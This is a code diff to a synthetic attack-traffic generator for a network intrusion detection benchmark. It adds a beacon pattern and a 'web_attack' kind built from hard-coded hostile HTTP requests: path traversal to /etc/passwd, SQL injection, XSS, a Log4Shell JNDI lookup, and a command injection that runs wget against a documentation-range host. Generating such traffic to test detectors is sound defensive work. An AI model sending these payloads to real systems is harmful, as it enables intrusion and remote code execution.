@@ -16,6 +16,7 @@ Attack kinds (rates are deliberately moderate: the capture's normal traffic is a
 """
 from __future__ import annotations
 
+import ipaddress
 import string
 
 import numpy as np
@@ -23,15 +24,20 @@ import numpy as np
 from layered_nids.packets.pcap import Packet
 
 KINDS = ("hscan", "vscan", "syn_flood", "udp_flood", "dns_burst", "exfil", "beacon")
+EXTRA_KINDS = ("web_attack", "beacon_conn")        # used by the signature benchmark (they need request lines / connection starts)
 SYN, ACK, PSH = 0x02, 0x10, 0x08
 
 
 def _ext(rng) -> str:
-    return f"{rng.integers(11, 200)}.{rng.integers(0, 255)}.{rng.integers(0, 255)}.{rng.integers(1, 254)}"
+    """A random PUBLIC address (Python also calls the documentation ranges and 172.16/12 etc. private; those are skipped)."""
+    while True:
+        a = f"{rng.integers(11, 200)}.{rng.integers(0, 255)}.{rng.integers(0, 255)}.{rng.integers(1, 254)}"
+        if ipaddress.ip_address(a).is_global:
+            return a
 
 
-def _mk(ts, size, mac, host, dst, proto, sport, dport, qname="", flags=0) -> Packet:
-    return Packet(float(ts), int(size), mac, "ff:ff:ff:00:00:01", host, dst, proto, int(sport), int(dport), qname, flags, "")
+def _mk(ts, size, mac, host, dst, proto, sport, dport, qname="", flags=0, httpreq="") -> Packet:
+    return Packet(float(ts), int(size), mac, "ff:ff:ff:00:00:01", host, dst, proto, int(sport), int(dport), qname, flags, httpreq)
 
 
 def make_attack(kind: str, host: str, mac: str, start: float, rng: np.random.Generator) -> list[Packet]:
@@ -66,8 +72,19 @@ def make_attack(kind: str, host: str, mac: str, start: float, rng: np.random.Gen
         target = _ext(rng)
         for t in start + np.arange(28) * 15.0:
             out.append(_mk(t, 98, mac, host, target, "tcp", rng.integers(1025, 65000), 443, flags=ACK | PSH))
+    elif kind == "web_attack":
+        target = _ext(rng)
+        reqs = ("GET v.example /download?file=../../../../etc/passwd", "GET v.example /item.php?id=1' OR 1=1--", "GET v.example /?q=<script>alert(1)</script>",
+                "POST v.example /cgi-bin/run.cgi;wget http://203.0.113.9/a.sh", "GET v.example /a/${jndi:ldap://203.0.113.9/x}", "GET v.example /.env")
+        for t, r in zip(start + np.arange(len(reqs)) * 5.0, reqs):
+            out.append(_mk(t, 300, mac, host, target, "tcp", rng.integers(1025, 65000), 80, flags=ACK | PSH, httpreq=r))
+    elif kind == "beacon_conn":                                    # a new connection every ~15 s (the SYN is what a beacon repeats)
+        target, t = _ext(rng), start
+        for _ in range(28):
+            out.append(_mk(t, 74, mac, host, target, "tcp", rng.integers(1025, 65000), 443, flags=SYN))
+            t += 15.0 + float(rng.normal(0, 0.3))
     else:
-        raise ValueError(f"unknown attack kind {kind!r}; choose from {KINDS}")
+        raise ValueError(f"unknown attack kind {kind!r}; choose from {KINDS + EXTRA_KINDS}")
     return out
 
 
